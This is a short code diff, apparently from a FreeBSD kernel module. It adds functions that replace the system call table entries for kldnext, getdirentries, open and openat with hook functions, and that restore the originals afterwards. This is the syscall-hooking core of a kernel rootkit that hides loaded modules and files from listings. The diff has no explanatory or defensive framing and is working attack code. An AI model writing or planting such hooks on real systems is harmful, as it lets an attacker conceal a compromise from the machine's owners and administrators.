@@ -40,6 +40,22 @@ static linker_file_t linker_find_file_by_id(int fileid) {
 	return (lf);
 }
 
+int insert_hooks(void) {
+	sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
+	sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
+	sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
+	sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
+	return 0;
+}
+
+int remove_hooks(void) {
+	sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
+	sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+	sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
+	sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
+	return 0;
+}
+
 int hook_sys_getdirentries(struct thread *td, struct getdirentries_args *uap)
 {
 	long base;
